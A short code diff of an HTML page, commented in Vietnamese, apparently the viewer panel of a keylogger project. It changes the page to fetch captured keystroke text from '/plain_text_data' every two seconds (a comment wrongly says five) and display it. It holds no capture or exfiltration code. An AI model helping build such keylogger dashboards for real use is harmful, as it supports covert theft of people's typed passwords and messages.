@@ -15,15 +15,22 @@
             }
         </style>
         <script>
-            setInterval(function() {
-                var keyloggerData = "{{ keylogger_data }}";  // Dữ liệu từ biến Python được chuyển thành chuỗi JSON
-                // Hiển thị dữ liệu trong một phần tử có id là "keylogger-data"
-                document.getElementById("keylogger-data").innerText = keyloggerData;
-            }, 1000);  // Cập nhật mỗi giây
+            function fetchDataAndUpdate() {
+                // Lấy dữ liệu từ máy chủ
+                fetch('/plain_text_data')
+                    .then(response => response.text())
+                    .then(data => {
+                        // Cập nhật dữ liệu trên view
+                        document.getElementById('keyLoggerData').innerText = data;
+                    });
+            }
+    
+            // Cập nhật dữ liệu sau mỗi 5 giây
+            setInterval(fetchDataAndUpdate, 2000);
         </script>
     </head>
     <body>
-        <div id="keylogger-data"></div>
+        <div id="keyLoggerData"></div>
     </body>
 
 </html>
